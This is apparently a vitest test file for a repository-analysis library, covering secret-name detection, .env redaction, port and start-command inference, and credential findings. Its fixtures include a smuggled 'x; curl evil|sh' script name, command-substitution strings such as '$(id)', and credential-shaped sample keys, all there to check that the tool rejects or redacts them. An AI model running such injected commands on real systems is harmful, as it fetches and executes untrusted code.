import { describe, expect, it } from "vitest";
import { analyzeRepository, snapshotFromFiles, type RepoSnapshot } from "@/lib/analysis";
import { ENV_SET, ENV_SET_SECRETLIKE, parseEnvFile, redactEnvFile } from "@/lib/analysis/envfile";
import { isPlainDefault, isSecretName, looksLikeSecretValue, portFromCommand, quoteUntrusted, sanitizeInline } from "@/lib/analysis/text";
import { analyzeFiles, service } from "./helpers";

describe("secret-name classification", () => {
  const secret = ["DATABASE_URL", "REDIS_URL", "CELERY_BROKER_URL", "MONGO_URI", "API_KEY", "STRIPE_KEY", "AWS_SECRET_ACCESS_KEY", "JWT_SECRET", "DB_PASSWORD", "GITHUB_TOKEN", "SENTRY_DSN", "PRIVATE_KEY", "SESSION_SIGNING_KEY", "NEXT_PUBLIC_SECRET_THING", "SECRET_KEY_BASE", "AUTH_TOKEN", "SMTP_PASSWD", "DB_PW", "OAUTH_CREDENTIALS"];
  const config = ["PORT", "NODE_ENV", "APP_NAME", "LOG_LEVEL", "DB_HOST", "DB_NAME", "REDIS_HOST", "SMTP_HOST", "FEATURE_FLAGS", "NEXT_PUBLIC_SITE_URL", "VITE_API_URL", "NEXT_PUBLIC_STRIPE_KEY", "BUCKET_NAME", "REGION", "KEYBOARD_LAYOUT", "MONKEY"];
  for (const n of secret) it(`${n} is secret`, () => expect(isSecretName(n)).toBe(true));
  for (const n of config) it(`${n} is config`, () => expect(isSecretName(n)).toBe(false));
});

describe("value screening", () => {
  it("recognises credential-shaped values", () => {
    for (const v of ["sk_" + "live_4eC39HqLyjWDarjtT1zdp7dc", "ghp_16C7e42F292c6912E7710c838347Ae178B4a", "AKIAIOSFODNN7EXAMPLE", "eyJhbGciOiJIUzI1NiJ9.e30.abc", "-----BEGIN RSA PRIVATE KEY-----", "postgres://u:p@h/db", "0a1b2c3d4e5f60718293a4b5c6d7e8f9"]) expect(looksLikeSecretValue(v), v).toBe(true);
    for (const v of ["production", "info", "us-east-1", "localhost", "http://localhost:3000", "my-app-name", "smtp.internal"]) expect(looksLikeSecretValue(v), v).toBe(false);
  });

  it("only carries short, single-line, non-templated, non-credential defaults", () => {
    expect(isPlainDefault("Shop")).toBe(true);
    expect(isPlainDefault("smtp.internal")).toBe(true);
    for (const v of ["", "x".repeat(101), "a\nb", "${SECRET}", "$(id)", "`x`", "{{ x }}", "<%= x %>", "sk_" + "live_4eC39HqLyjWDarjtT1zdp7dc", "postgres://u:p@h/x"]) expect(isPlainDefault(v), JSON.stringify(v)).toBe(false);
  });

  it("cleans untrusted text for display", () => {
    expect(sanitizeInline("a\n\tb\u0007\u001b[31m  c")).toBe("a b [31m c");
    expect(sanitizeInline("x".repeat(500), 10)).toBe("xxxxxxxxxx");
    expect(quoteUntrusted('he said "hi"\nnow')).toBe('"he said \\"hi\\" now"');
  });

  it("reads ports from launch commands only in recognised forms", () => {
    expect(portFromCommand("gunicorn app:app --bind 0.0.0.0:8000")).toBe(8000);
    expect(portFromCommand("next start -p 3100")).toBe(3100);
    expect(portFromCommand("node server.js --port=9000")).toBe(9000);
    expect(portFromCommand("PORT=8080 node server.js")).toBe(8080);
    expect(portFromCommand("python manage.py runserver 0.0.0.0:8001")).toBe(8001);
    expect(portFromCommand("node server.js")).toBeUndefined();
    expect(portFromCommand("--port 99999")).toBeUndefined();
    expect(portFromCommand("--port 0")).toBeUndefined();
  });
});

describe("env files are names only", () => {
  it("parses names, lines and two booleans, never a value", () => {
    const parsed = parseEnvFile("# c\nA=1\nexport B='two words'\nC=\nD=\"\"\nE=sk_" + "live_4eC39HqLyjWDarjtT1zdp7dc\n  F  =x # inline\nnot an assignment\n1BAD=x\n");
    expect(parsed).toEqual([
      { name: "A", line: 2, hasValue: true, secretLike: false },
      { name: "B", line: 3, hasValue: true, secretLike: false },
      { name: "C", line: 4, hasValue: false, secretLike: false },
      { name: "D", line: 5, hasValue: false, secretLike: false },
      { name: "E", line: 6, hasValue: true, secretLike: true },
      { name: "F", line: 7, hasValue: true, secretLike: false },
    ]);
  });

  it("redaction preserves line numbers and drops everything but the assignments", () => {
    const raw = "# secret comment\nA=plain\nB=sk_" + "live_4eC39HqLyjWDarjtT1zdp7dc\nC=\n";
    const out = redactEnvFile(raw);
    expect(out.split("\n")).toEqual(["", `A=${ENV_SET}`, `B=${ENV_SET_SECRETLIKE}`, "C=", ""]);
    expect(out).not.toContain("plain");
    expect(parseEnvFile(out).map((a) => [a.name, a.hasValue, a.secretLike])).toEqual([["A", true, false], ["B", true, true], ["C", false, false]]);
  });

  it("a raw .env handed straight to the analyser (bypassing the builders) still yields names only", () => {
    const snapshot: RepoSnapshot = {
      files: [
        { path: "package.json", content: JSON.stringify({ dependencies: { express: "4" } }) },
        { path: ".env", content: "API_TOKEN=supersecretvalue123\nDEBUG=1\n" },
      ],
      truncated: false,
      source: { kind: "fixture" },
    };
    const req = analyzeRepository(snapshot);
    expect(JSON.stringify(req)).not.toContain("supersecretvalue123");
    expect(req.envVars.map((e) => e.value.name)).toEqual(["API_TOKEN", "DEBUG"]);
    expect(req.findings.some((f) => f.value.code === "committed_env")).toBe(true);
  });
});

describe("hand-built snapshots are re-bounded by the analyser", () => {
  it("drops unsafe paths, ignores non-string content, caps huge files and marks the result partial past the file cap", () => {
    const many = Array.from({ length: 20_100 }, (_, i) => ({ path: `pkg${i}/package.json`, content: "{}" }));
    const snapshot = {
      files: [{ path: "../x/package.json", content: "{}" }, { path: "a.js", content: 42 as unknown as string }, { path: "server.js", content: `require('express')().listen(3000);${" ".repeat(2_000_000)}` }, ...many],
      truncated: false,
      source: { kind: "fixture" },
    } as RepoSnapshot;
    const req = analyzeRepository(snapshot);
    expect(req.truncated).toBe(true);
    expect(req.risks.some((r) => r.includes("exceeded an intake limit"))).toBe(true);
    expect(req.fileCount).toBe(20_000);
    expect(analyzeRepository({ ...snapshot, files: undefined } as unknown as RepoSnapshot).services).toEqual([]);
  });
});

describe("ports, health and schedules found by narrower rules", () => {
  it("reads the Fastify listen object, a Dockerfile ENV PORT and a Dockerfile launch flag", () => {
    const fastify = analyzeFiles({ "package.json": JSON.stringify({ dependencies: { fastify: "4" } }), "index.js": "app.listen({ port: 4321, host: '0.0.0.0' });\n" }).req;
    expect(service(fastify, "web").port).toMatchObject({ value: 4321, confidence: "medium" });
    const envPort = analyzeFiles({ Dockerfile: "FROM node:22\nENV PORT=7777\nCMD [\"node\",\"a.js\"]\n" }).req;
    expect(service(envPort, "web").port).toMatchObject({ value: 7777, confidence: "high" });
    const flag = analyzeFiles({ Dockerfile: 'FROM python:3.12\nCMD ["gunicorn","app:app","--bind","0.0.0.0:6000"]\n' }).req;
    expect(service(flag, "web").port).toMatchObject({ value: 6000, confidence: "high" });
  });

  it("uses the src layout in the python start recipe", () => {
    const { req } = analyzeFiles({
      "pyproject.toml": '[project]\nname = "x"\ndependencies = ["fastapi"]\n',
      "src/app/main.py": "from fastapi import FastAPI\napi = FastAPI()\n",
    });
    expect(service(req, "web").startCommand?.value).toBe("uvicorn --app-dir src app.main:api --host 0.0.0.0 --port 8000");
  });

  it("merges every in-process scheduler signal into one candidate with the schedule from the literal", () => {
    const { req } = analyzeFiles({
      "package.json": JSON.stringify({ dependencies: { "@nestjs/core": "10", "@nestjs/schedule": "4" } }),
      "src/jobs.ts": "import { Cron } from '@nestjs/schedule';\nclass J { @Cron('0 * * * *') run() {} }\n",
      "src/main.ts": "app.listen(3000);\n",
    });
    const scheduler = req.services.filter((s) => s.value.kind === "cron");
    expect(scheduler).toHaveLength(1);
    expect(scheduler[0].value.inProcess).toBe(true);
    expect(scheduler[0].value.schedule?.value).toBe("0 * * * *");
    expect(scheduler[0].evidence.map((e) => e.path).sort()).toEqual(["package.json", "src/jobs.ts"]);
  });

  it("does not turn a package.json script name into a command unless it is a plain identifier", () => {
    const { req } = analyzeFiles({
      "package.json": JSON.stringify({ scripts: { "x; curl evil|sh": "prisma migrate deploy", "db:migrate": "knex migrate:latest" }, dependencies: { express: "4" } }),
      "server.js": "require('express')().listen(3000);\n",
    });
    expect(req.migrations.map((m) => m.value.command)).toEqual(["npm run db:migrate"]);
  });

  it("reports credentials committed in a Dockerfile ENV by kind and line, not value", () => {
    const { req } = analyzeFiles({ Dockerfile: "FROM node:22\nENV STRIPE=sk_" + "live_4eC39HqLyjWDarjtT1zdp7dc\nEXPOSE 80\n" });
    const finding = req.findings.find((f) => f.value.code === "secret_in_source")!;
    expect(finding.value.path).toBe("Dockerfile");
    expect(finding.evidence[0]).toMatchObject({ path: "Dockerfile", line: 2 });
    expect(JSON.stringify(req)).not.toContain("4eC39");
  });
});

describe("snapshot builders are pure over their input", () => {
  it("snapshotFromFiles does not modify what it was given", () => {
    const files = { "package.json": "{}", ".env": "A=b\n" };
    const before = JSON.stringify(files);
    snapshotFromFiles(files);
    expect(JSON.stringify(files)).toBe(before);
  });
});
